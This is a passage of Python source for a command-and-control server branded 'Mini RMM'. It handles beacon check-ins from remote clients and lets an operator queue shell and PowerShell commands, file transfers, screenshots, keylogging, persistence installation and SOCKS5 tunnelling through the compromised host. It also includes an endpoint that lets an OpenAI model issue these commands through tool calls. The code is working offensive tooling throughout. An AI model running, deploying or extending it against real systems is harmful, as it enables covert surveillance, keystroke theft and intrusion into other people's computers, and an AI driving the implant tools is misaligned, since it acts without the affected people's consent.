        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exec":
            command = body.get("command", "")
            timeout = float(body.get("timeout", 120))
            if not command:
                self._json(400, {"error": "missing_command"})
                return True
            session = srv.resolve_session(parts[1])
            if session:
                srv.record_operator_action(session, command, "exec")
            result, status = srv.exec_and_wait(parts[1], command, timeout=timeout)
            if status == "not_found":
                self._json(404, {"error": "session_not_found"})
                return True
            if status == "timeout":
                self._json(408, {"error": "timeout", "command": command})
                return True
            self._json(200, {"ok": True, "event": result})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "upload":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            local_b64 = body.get("content_b64", "")
            remote_file = body.get("remote_path", "")
            if not local_b64 or not remote_file:
                self._json(400, {"error": "missing_content_b64_or_remote_path"})
                return True
            data = json.dumps({
                "filename": os.path.basename(remote_file),
                "content": local_b64,
            })
            cmd = f"__UPLOAD__ {remote_file}"
            srv.set_command(session.id, f"{cmd}\n{data}", "oneshot")
            srv.record_operator_action(session, cmd, "upload")
            self._json(200, {"ok": True, "session_id": session.id})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "download":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            remote_path = body.get("remote_path", "").strip()
            if not remote_path:
                self._json(400, {"error": "missing_remote_path"})
                return True
            cmd = f"__DOWNLOAD__ {remote_path}"
            srv.set_command(session.id, cmd, "oneshot")
            srv.record_operator_action(session, cmd, "download")
            self._json(200, {"ok": True, "session_id": session.id, "queued": cmd})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "screenshot":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            srv.set_command(session.id, "__SCREENSHOT__", "oneshot")
            srv.record_operator_action(session, "__SCREENSHOT__", "screenshot")
            self._json(200, {"ok": True, "session_id": session.id, "queued": "__SCREENSHOT__"})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            if body.get("stop"):
                srv.stop_socks(session.id)
                self._json(200, {"ok": True, "session_id": session.id, "stopped": True})
                return True
            port = int(body.get("port", DEFAULT_SOCKS_PORT))
            if port < 1 or port > 65535:
                self._json(400, {"error": "invalid_port"})
                return True
            bind_host = str(body.get("bind_host", DEFAULT_BIND_HOST))
            if not srv.start_socks(session.id, port=port, bind_host=bind_host):
                self._json(500, {"error": "socks_start_failed"})
                return True
            self._json(
                200,
                {
                    "ok": True,
                    "session_id": session.id,
                    "socks_url": f"socks5://{bind_host}:{port}",
                    "socks_active": True,
                },
            )
            return True

        if parts == ["ai", "chat"]:
            openai_key = (body.get("openai_api_key") or os.environ.get("OPENAI_API_KEY", "")).strip()
            if not openai_key:
                self._json(400, {"error": "missing_openai_api_key"})
                return True
            messages = body.get("messages") or []
            if not messages:
                self._json(400, {"error": "missing_messages"})
                return True
            model = str(body.get("model") or "gpt-4o-mini")
            selected = body.get("selected_session_id")
            rmm_token = (self._api_token_from_request() or API_TOKEN or "").strip()
            if not rmm_token:
                self._json(401, {
                    "error": "unauthorized",
                    "detail": "Valid RMM_API_TOKEN required for AI tool calls",
                })
                return True
            try:
                from rmm_ai import run_ai_chat

                result = run_ai_chat(
                    rmm_base_url=self._operator_api_base_url(),
                    rmm_token=rmm_token,
                    openai_api_key=openai_key,
                    messages=messages,
                    model=model,
                    selected_session_id=selected,
                    exegol_mcp_enabled=body.get("exegol_mcp_enabled"),
                    exegol_mcp_url=body.get("exegol_mcp_url"),
                    exegol_mcp_token=body.get("exegol_mcp_token"),
                )
                status = 200 if result.get("ok") else 500
                self._json(status, result)
            except ValueError as e:
                self._json(400, {"error": str(e)})
            except RuntimeError as e:
                self._json(502, {"error": "openai_error", "detail": str(e)})
            except Exception as e:
                self._json(500, {"error": "ai_chat_failed", "detail": str(e)})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _request_base_url(self) -> str:
        host = self.headers.get("Host", f"127.0.0.1:{PORT}")
        proto = self.headers.get("X-Forwarded-Proto", "").strip().lower()
        if proto not in ("http", "https"):
            proto = "http"
        return f"{proto}://{host}"

    def _operator_api_base_url(self) -> str:
        """Loopback URL for in-process clients (AI/MCP) calling the operator API."""
        host = LISTEN_HOST
        if host in ("0.0.0.0", "::", ""):
            host = "127.0.0.1"
        elif host == "::1":
            host = "127.0.0.1"
        return f"http://{host}:{PORT}"

    def _handle_api_patch(self, path, body):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "config":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            ok = srv.update_session_config(
                session.id,
                sleep_seconds=body.get("sleep_seconds"),
                jitter_percent=body.get("jitter_percent"),
            )
            if ok:
                parts_cfg = []
                if body.get("sleep_seconds") is not None:
                    parts_cfg.append(f"sleep={body['sleep_seconds']}")
                if body.get("jitter_percent") is not None:
                    parts_cfg.append(f"jitter={body['jitter_percent']}")
                if parts_cfg:
                    srv.record_operator_action(session, " ".join(parts_cfg), "config")
                self._json(200, {"ok": True, "session": session.to_dict()})
            else:
                self._json(404, {"error": "session_not_found"})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _handle_api_delete(self, path):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 2 and parts[0] == "sessions":
            ok, detail = srv.kill_session(parts[1])
            if not ok:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"ok": True, "session_id": detail})
            return True

        self._json(404, {"error": "not_found"})
        return True
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path == f"{API_PREFIX}/ws":
            if self._handle_websocket_upgrade(qs):
                return

        if path.startswith(API_PREFIX):
            if self._handle_api_get(path, qs):
                return
            self._respond(404, "Not Found")
            return

        if self._serve_web(path):
            return
        
        if path in ("/register", "/cmd", "/ping", "/socks"):
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return

        if path == "/register":
            raw_id = qs.get("id", [None])[0]
            if raw_id is None or not str(raw_id).strip():
                self._respond(400, "Missing session ID")
                return
            session_id = validate_beacon_session_id(str(raw_id))
            if not session_id:
                self._respond(400, "INVALID SESSION ID")
                return
            hostname = qs.get("h", ["unknown"])[0]
            username = qs.get("u", ["unknown"])[0]
            ip = self.client_address[0]
            sleep_seconds = None
            jitter_percent = None
            sync_client = str(qs.get("sync", ["0"])[0]).lower() in ("1", "true", "yes")
            try:
                if qs.get("s", [None])[0] is not None:
                    sleep_seconds = int(qs["s"][0])
            except (TypeError, ValueError):
                pass
            try:
                if qs.get("j", [None])[0] is not None:
                    jitter_percent = int(qs["j"][0])
            except (TypeError, ValueError):
                pass
            reg = self.server_instance.register_session(
                session_id,
                hostname,
                username,
                ip,
                sleep_seconds=sleep_seconds,
                jitter_percent=jitter_percent,
                sync_client_config=sync_client,
            )
            if reg is None:
                self._respond(403, "TERMINATED")
            else:
                self._respond(200, "REGISTERED" if reg else "UPDATED")
        
        elif path == "/cmd":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                cmd, resp_type = self.server_instance.get_command(session_id)
                response = json.dumps({
                    "command": cmd,
                    "type": resp_type,
                    "socks_active": self.server_instance.socks_active(session_id),
                })
                self._respond(200, response, "application/json")
        
        elif path == "/ping":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                self.server_instance.touch_session(session_id)
                self._respond(200, "PONG")

        elif path == "/socks":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                self.server_instance.touch_session(session_id)
                tasks = self.server_instance.socks.poll_tasks(session_id)
                active = self.server_instance.socks_active(session_id)
                self._respond(
                    200,
                    json.dumps({"active": active, "tasks": tasks}),
                    "application/json",
                )
        
        else:
            self._respond(404, "Not Found")
    
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if path.startswith(API_PREFIX):
            try:
                body = self._read_json_body()
            except ValueError:
                self._json(413, {"error": "payload_too_large"})
                return
            except json.JSONDecodeError:
                self._json(400, {"error": "invalid_json"})
                return
            if self._handle_api_post(path, body):
                return
            self._respond(404, "Not Found")
            return

        if path in ("/result", "/socks"):
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return
            try:
                body = self._read_body_bytes().decode(errors="replace")
            except ValueError:
                self._respond(413, "PAYLOAD TOO LARGE")
                return

        if path == "/socks":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            self.server_instance.touch_session(session_id)
            if not self.server_instance.socks.post_responses(session_id, body):
                self._respond(400, "INVALID SOCKS PAYLOAD")
            else:
                self._respond(200, "OK")
            return

        if path == "/result":
            raw_id = qs.get("id", [None])[0]
            result_type = qs.get("type", ["output"])[0]
            if raw_id is None or not str(raw_id).strip():
                self._respond(400, "Missing session ID")
                return
            session_id = validate_beacon_session_id(str(raw_id))
            if not session_id:
                self._respond(400, "INVALID SESSION ID")
                return
            self.server_instance.handle_result(session_id, body, result_type)
            self._respond(200, "OK")
        
        else:
            self._respond(404, "Not Found")

    def do_PATCH(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if not path.startswith(API_PREFIX):
            self._respond(404, "Not Found")
            return
        try:
            body = self._read_json_body()
        except ValueError:
            self._json(413, {"error": "payload_too_large"})
            return
        except json.JSONDecodeError:
            self._json(400, {"error": "invalid_json"})
            return
        if self._handle_api_patch(path, body):
            return
        self._respond(404, "Not Found")

    def do_DELETE(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if not path.startswith(API_PREFIX):
            self._respond(404, "Not Found")
            return
        if self._handle_api_delete(path):
            return
        self._respond(404, "Not Found")

class CommandInterface:
    def __init__(self, server):
        self.server = server
        self.aliases = {
            "ls": "dir",
            "help": "?",
            "sessions": "list",
            "exit": "quit"
        }
    
    def show_help(self):
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.END}

{Colors.CYAN}Session Management:{Colors.END}
  {Colors.GREEN}list{Colors.END}                     - List active sessions
  {Colors.GREEN}use <session_id>{Colors.END}         - Select a session (full ID or first 4+ chars)
  {Colors.GREEN}info{Colors.END}                     - Show current session info
  {Colors.GREEN}background{Colors.END}               - Return to global view
  {Colors.GREEN}kill <session_id>{Colors.END}        - End session and stop the remote client

{Colors.CYAN}Beacon Configuration:{Colors.END}
  {Colors.GREEN}set_sleep <seconds>{Colors.END}      - Set beacon interval (1-3600 seconds)
  {Colors.GREEN}set_jitter <percent>{Colors.END}     - Set jitter percentage (0-100)
  {Colors.GREEN}show_config{Colors.END}              - Show current session config

{Colors.CYAN}Command Execution:{Colors.END}
  {Colors.DIM}(commands queue FIFO between client polls){Colors.END}
  {Colors.DIM}Windows CMD: use double quotes for paths with spaces; NET GROUP needs group name before /domain.{Colors.END}
  {Colors.GREEN}<command>{Colors.END}                - CMD (cmd.exe), e.g. sc query, dir /w
  {Colors.GREEN}PS: / powershell: <script>{Colors.END}   - Windows PowerShell (powershell.exe)
  {Colors.GREEN}pwsh: <script>{Colors.END}           - PowerShell 7 if pwsh is installed
  {Colors.GREEN}cmd: <line>{Colors.END}             - Explicit CMD (same as default)
  {Colors.GREEN}shell <command>{Colors.END}          - Same as a bare command
  {Colors.GREEN}persist <command>{Colors.END}        - Persistent command (repeats)
  {Colors.GREEN}stop{Colors.END}                     - Stop persistent command

{Colors.CYAN}File Operations:{Colors.END}
  {Colors.GREEN}download <file>{Colors.END}          - Download file from target
  {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target

{Colors.CYAN}Tunneling:{Colors.END}
  {Colors.GREEN}socks [port]{Colors.END}           - SOCKS5 on 127.0.0.1 (default port {DEFAULT_SOCKS_PORT})
  {Colors.GREEN}socks stop{Colors.END}             - Stop SOCKS relay for this session

{Colors.CYAN}Reconnaissance:{Colors.END}
  {Colors.GREEN}screenshot{Colors.END}               - Capture screenshot
  {Colors.GREEN}keylog start/stop/dump{Colors.END}   - Keylogging operations

{Colors.CYAN}Persistence:{Colors.END}
  {Colors.GREEN}install_persist{Colors.END}          - Install persistence
  {Colors.GREEN}remove_persist{Colors.END}           - Remove persistence

{Colors.CYAN}Other:{Colors.END}
  {Colors.GREEN}clear{Colors.END}                    - Clear screen
  {Colors.GREEN}quit{Colors.END}                     - Exit RMM server

{Colors.YELLOW}Tip:{Colors.END} Use TAB key for command completion and history navigation
"""
        self.server.tty_print(help_text)
    
    def execute_command(self, cmd_line):
        if not cmd_line.strip():
            return True

        parts = cmd_line.strip().split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []

        # Handle aliases
        cmd = self.aliases.get(cmd, cmd)

        # Global commands
        if cmd in ["quit", "exit"]:
            self.server.tty_print(f"{Colors.YELLOW}Shutting down server...{Colors.END}")
            if not getattr(self.server, "_cli_use_ptk", False):
                readline.write_history_file(HISTORY_FILE)
            self.server.running = False
            return False

        elif cmd == "list":
            self.server.list_sessions()

        elif cmd == "kill":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    with self.server.session_lock:
                        self.server.killed_sessions.add(session.id)
                        del self.server.sessions[session.id]
                        self.server.tty_print(f"{Colors.GREEN}Session {session.id[:8]} terminated (client will exit on next beacon){Colors.END}")
                        if self.server.current_session == session.id:
                            self.server.current_session = None
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: kill <session_id>{Colors.END}")

        elif cmd == "use":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    self.server.current_session = session.id
                    self.server.tty_print(f"{Colors.GREEN}Selected session: {session}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
                    self.server.tty_print(f"{Colors.YELLOW}Use 'list' to see available sessions{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: use <session_id>{Colors.END}")
                self.server.tty_print(f"{Colors.YELLOW}You can use full ID or first 4+ characters (e.g., 'use 2318'){Colors.END}")

        elif cmd == "info":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    self.server.tty_print(f"\n{Colors.BOLD}Session Information:{Colors.END}")
                    self.server.tty_print(f"  ID: {session.id}", ansi=False)
                    self.server.tty_print(f"  User: {session.username}", ansi=False)
                    self.server.tty_print(f"  Hostname: {session.hostname}", ansi=False)
                    self.server.tty_print(f"  IP: {session.ip or 'N/A'}", ansi=False)
                    self.server.tty_print(f"  First Seen: {session.first_seen}", ansi=False)
                    self.server.tty_print(f"  Last Seen: {session.last_seen}", ansi=False)
                    self.server.tty_print(f"  Working Dir: {session.work_dir or 'Unknown'}", ansi=False)
                    self.server.tty_print(f"  OS: {session.os_type}", ansi=False)
                    self.server.tty_print(f"  Sleep Interval: {session.sleep_seconds} seconds", ansi=False)
                    self.server.tty_print(f"  Jitter: {session.jitter_percent}%\n", ansi=False)
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "show_config":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    jitter_range = session.sleep_seconds * session.jitter_percent / 100
                    min_sleep = session.sleep_seconds - jitter_range
                    max_sleep = session.sleep_seconds + jitter_range
                    self.server.tty_print(f"\n{Colors.BOLD}Current Beacon Configuration:{Colors.END}")
                    self.server.tty_print(f"  Session: {session.id[:8]}", ansi=False)
                    self.server.tty_print(
                        f"  Sleep Interval: {Colors.GREEN}{session.sleep_seconds}{Colors.END} seconds"
                    )
                    self.server.tty_print(
                        f"  Jitter Percentage: {Colors.GREEN}{session.jitter_percent}{Colors.END}%"
                    )
                    self.server.tty_print(
                        f"  Effective Range: {Colors.CYAN}{min_sleep:.1f}{Colors.END} - "
                        f"{Colors.CYAN}{max_sleep:.1f}{Colors.END} seconds\n"
                    )
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "set_sleep":
            if self.server.current_session:
                if args:
                    try:
                        new_sleep = int(args[0])
                        if 1 <= new_sleep <= 3600:
                            self.server.update_session_config(self.server.current_session, sleep_seconds=new_sleep)
                            self.server.tty_print(f"{Colors.GREEN}Sleep interval updated to {new_sleep} seconds{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Sleep must be between 1 and 3600 seconds{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_sleep <seconds (1-3600)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "set_jitter":
            if self.server.current_session:
                if args:
                    try:
                        new_jitter = int(args[0])
                        if 0 <= new_jitter <= 100:
                            self.server.update_session_config(self.server.current_session, jitter_percent=new_jitter)
                            self.server.tty_print(f"{Colors.GREEN}Jitter updated to {new_jitter}%{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Jitter must be between 0 and 100{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_jitter <percent (0-100)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "background":
            self.server.current_session = None
            self.server.tty_print(f"{Colors.GREEN}Returned to global view{Colors.END}")

        elif cmd == "help" or cmd == "?":
            self.show_help()

        elif cmd == "clear":
            os.system('clear' if os.name == 'posix' else 'cls')

        # Commands that require a selected session
        elif self.server.current_session:
            if cmd in ["shell", "exec"]:
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: shell <command>{Colors.END}")

            elif cmd == "persist":
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "persistent")
                    self.server.tty_print(f"{Colors.DIM}Persistent command activated (use 'stop' to end){Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: persist <command>{Colors.END}")

            elif cmd == "stop":
                self.server.set_command(self.server.current_session, "__STOP__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Persistent command stopped{Colors.END}")

            elif cmd == "download":
                if args:
                    filepath = args[0]
                    command = f"__DOWNLOAD__ {filepath}"
                    self.server.set_command(self.server.current_session, command, "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Downloading {filepath}...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")

            elif cmd == "upload":
                if len(args) >= 2:
                    local_file = args[0]
                    remote_file = args[1]
                    if os.path.exists(local_file):
                        with open(local_file, 'rb') as f:
                            content = base64.b64encode(f.read()).decode()
                        data = json.dumps({
                            "filename": os.path.basename(remote_file),
                            "content": content
                        })
                        self.server.set_command(self.server.current_session, f"__UPLOAD__ {remote_file}\n{data}", "oneshot")
                        self.server.tty_print(f"{Colors.DIM}Uploading {local_file} to {remote_file}...{Colors.END}")
                    else:
                        self.server.tty_print(f"{Colors.RED}Local file not found: {local_file}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: upload <local_file> <remote_file>{Colors.END}")

            elif cmd == "screenshot":
                self.server.set_command(self.server.current_session, "__SCREENSHOT__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Taking screenshot...{Colors.END}")

            elif cmd in ["keylog", "keylogger"]:
                if args:
                    action = args[0]
                    self.server.set_command(self.server.current_session, f"__KEYLOG__ {action}", "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Keylog {action}...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: keylog start/stop/dump{Colors.END}")

            elif cmd == "install_persist":
                self.server.set_command(self.server.current_session, "__INSTALL_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Installing persistence...{Colors.END}")

            elif cmd == "remove_persist":
                self.server.set_command(self.server.current_session, "__REMOVE_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Removing persistence...{Colors.END}")

            elif cmd == "socks":
                if args and args[0].lower() == "stop":
                    self.server.stop_socks(self.server.current_session)
                    self.server.tty_print(f"{Colors.DIM}SOCKS relay stopped{Colors.END}")
                else:
                    port = DEFAULT_SOCKS_PORT
                    if args:
                        try:
                            port = int(args[0])
                            if port < 1 or port > 65535:
                                raise ValueError
                        except ValueError:
                            self.server.tty_print(f"{Colors.RED}Invalid port (1-65535){Colors.END}")
                            return True
                    if self.server.start_socks(self.server.current_session, port):
                        self.server.tty_print(
                            f"{Colors.GREEN}SOCKS5 on {DEFAULT_BIND_HOST}:{port} — "
                            f"point tools at socks5://127.0.0.1:{port}{Colors.END}"
                        )
                        self.server.tty_print(
                            f"{Colors.DIM}Client must beacon; traffic exits the remote host. "
                            f"Use 'socks stop' when done.{Colors.END}"
                        )
                    else:
                        self.server.tty_print(f"{Colors.RED}Failed to start SOCKS (session or bind error){Colors.END}")

            else:
                # Regular shell command
                self.server.set_command(self.server.current_session, cmd_line, "oneshot")
                self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")

        else:
            self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'list' then 'use <id>' or type 'help'{Colors.END}")
            self.server.tty_print(f"{Colors.YELLOW}Tip: You can use the first 4-8 characters of the session ID (e.g., 'use 2318'){Colors.END}")

        return True

def main():
    global PORT, API_TOKEN, BEACON_SECRET, INSECURE, LISTEN_HOST

    parser = argparse.ArgumentParser(description="Mini RMM HTTP server")
    parser.add_argument("port", nargs="?", type=int, default=8080, help="Listen port (default: 8080)")
    parser.add_argument(
        "--cli",
        action="store_true",
        help="Run embedded interactive console (default: API-only headless)",
    )
    parser.add_argument(
        "--token",
        default="",
        help="Operator API token (or set RMM_API_TOKEN)",
    )
    parser.add_argument(
        "--beacon-secret",
        default="",
        help="Beacon shared secret (or set RMM_BEACON_SECRET); required for clients",
    )
    parser.add_argument(
        "--bind",
        default=LISTEN_HOST,
        help="Listen address (default: 127.0.0.1; use 0.0.0.0 only behind a firewall)",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="LAB ONLY: allow missing API/beacon secrets (open C2 — never on a network)",
    )
    args = parser.parse_args()
    PORT = args.port
    LISTEN_HOST = args.bind
    INSECURE = args.insecure
    if args.token:
        API_TOKEN = args.token.strip()
    if args.beacon_secret:
        BEACON_SECRET = args.beacon_secret.strip()

    if not INSECURE:
        if not API_TOKEN:
            print(
                f"{Colors.RED}[!] Set RMM_API_TOKEN (or --token). "
                f"Use --insecure for local lab only.{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        if not BEACON_SECRET:
            print(
                f"{Colors.RED}[!] Set RMM_BEACON_SECRET (or --beacon-secret). "
                f"Use --insecure for local lab only.{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
    else:
        print(
            f"{Colors.RED}[!] --insecure: operator API and beacon endpoints are unauthenticated{Colors.END}"
        )

    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("""
    ╔═══════════════════════════════════════════╗
    ║        Mini RMM Server v3.0                ║
    ║     HTTP Command & Control + REST API      ║
    ║   Operator CLI: python rmm_cli.py          ║
    ╚═══════════════════════════════════════════╝
    """ + Colors.END)

    server = RMMServer()
    RMMHandler.server_instance = server

    # ThreadingHTTPServer: beacons (/cmd, /result), operator API, and WebSocket run concurrently.
    http_server = ThreadingHTTPServer((LISTEN_HOST, PORT), RMMHandler)
    http_server.daemon_threads = True

    print(f"{Colors.GREEN}[*] RMM listening on {LISTEN_HOST}:{PORT} (threaded HTTP){Colors.END}")
    print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{PORT}{API_PREFIX}/{Colors.END}")
    print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{PORT}/ui/{Colors.END}")
    print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{PORT}{Colors.END}")
    print(f"{Colors.CYAN}[*] MCP: python mcp_rmm_server.py (see README){Colors.END}")
    print(f"{Colors.CYAN}[*] Web AI: /ui/ → AI Assistant panel (OpenAI key + RMM tools){Colors.END}")
    print(f"{Colors.CYAN}[*] Tunnel: cloudflared tunnel --url http://localhost:{PORT}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Logs: {LOG_DIR}{Colors.END}")
    if API_TOKEN:
        print(f"{Colors.YELLOW}[*] Operator API auth: enabled ({API_PREFIX}/*){Colors.END}")
    if BEACON_SECRET:
        print(f"{Colors.YELLOW}[*] Beacon auth: X-RMM-Beacon-Token required{Colors.END}")
    print()
    
    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
    http_thread.start()
    
    if not args.cli:
        print(f"{Colors.BOLD}[*] Headless mode. Press Ctrl+C to stop.{Colors.END}\n")
        try:
            while server.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
        http_server.shutdown()
        return

    cli = CommandInterface(server)
    print(f"{Colors.BOLD}Embedded CLI — type 'help' for commands{Colors.END}")
    try:
        __import__("prompt_toolkit")
        _have_ptk = True
    except ImportError:
        _have_ptk = False

    if _have_ptk:
        print(
            f"{Colors.YELLOW}Tip: Client output scrolls above; your input line stays fixed at the bottom.{Colors.END}\n"
        )
        _run_cli_prompt_toolkit(server, cli)
    else:
        print(
            f"{Colors.CYAN}[*] pip install -r requirements.txt for the fixed bottom prompt (prompt_toolkit).{Colors.END}\n"
        )
        _run_cli_readline(server, cli)

    if not getattr(server, "_cli_use_ptk", False):
        readline.write_history_file(HISTORY_FILE)
    http_server.shutdown()

if __name__ == "__main__":
    main()
